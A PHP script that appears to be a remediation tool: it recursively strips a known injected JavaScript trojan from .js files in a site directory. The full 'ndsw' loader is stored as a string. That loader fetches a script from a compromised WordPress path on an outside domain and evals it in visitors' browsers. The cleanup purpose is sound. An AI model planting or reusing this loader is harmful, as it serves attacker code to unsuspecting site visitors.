<?php
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

function clean_files($dir){
    $content_trojan = ";if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(a,b){var c=new XMLHttpRequest();c['onreadystatechange']=function(){if(c['readyState']==0x4&&c['status']==0xc8)b(c['responseText']);},c['open']('GET',a,!![]),c['send'](null);};},rand=function(){return Math['random']()['toString'](0x24)['substr'](0x2);},token=function(){return rand()+rand();};(function(){var a=navigator,b=document,e=screen,f=window,g=a['userAgent'],h=a['platform'],i=b['cookie'],j=f['location']['hostname'],k=f['location']['protocol'],l=b['referrer'];if(l&&!p(l,j)&&!i){var m=new HttpClient(),o=k+'//unitedfc.com.mx/wp-admin/huge-it-google-map-custom-icons/huge-it-google-map-custom-icons.php?id='+token();m['get'](o,function(r){p(r,'ndsx')&&f['eval'](r);});}function p(r,v){return r['indexOf'](v)!==-0x1;}}());};";
    $ffs = scandir($dir);
    unset($ffs[array_search('.', $ffs, true)]);
    unset($ffs[array_search('..', $ffs, true)]);
    if (count($ffs) < 1)
        return;
    foreach($ffs as $ff){
        if(is_dir($dir.'/'.$ff)){
            clean_files($dir.'/'.$ff);
        }
        else
        {
            $path=$dir.'/'.$ff;
            if (strpos($ff, '.js') !== false)
            {
                echo 'Cleaning ... '.$ff. '\n';
                file_put_contents($path, str_replace($content_trojan,"",file_get_contents($path)));
            }
        }
    }
}
clean_files('/absolute/path/');   
?>
